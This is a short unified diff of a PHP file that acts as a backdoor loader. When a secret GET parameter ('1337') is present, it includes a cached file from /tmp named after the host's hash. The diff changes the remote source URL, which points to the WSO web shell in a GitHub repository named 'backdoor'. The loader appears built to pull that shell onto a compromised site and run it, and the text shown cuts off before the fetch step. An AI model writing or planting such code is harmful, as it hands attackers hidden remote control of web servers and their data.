@@ -1,6 +1,6 @@
 <?php
 if(isset($_GET["1337"]))
-$data = ['https://raw.githubusercontent.com/oldplayer69/backdoor/main/wso.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://raw.githubusercontent.com/herasec7/backdoor/main/wso.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
 } else {
